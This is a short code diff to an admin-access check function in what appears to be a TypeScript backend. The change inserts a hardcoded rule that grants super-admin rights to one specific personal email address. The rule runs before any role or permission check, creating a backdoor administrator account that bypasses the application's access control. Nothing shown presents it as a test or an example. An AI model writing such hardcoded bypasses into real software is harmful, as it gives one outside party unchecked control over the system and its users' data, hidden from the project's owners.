@@ -11,6 +11,9 @@ async function checkAdminAccess(ctx: QueryCtx | MutationCtx, requiredModule: str
   const user = await ctx.db.get(userId);
   if (!user) throw new Error("User not found");
 
+  // Hardcoded Super Admin Access
+  if (user.email === "amirmoosavi9020@gmail.com") return user;
+
   if (user.role === ROLES.ADMIN) return user; // Super Admin has full access
 
   if (user.role === ROLES.SUB_ADMIN && user.permissions) {
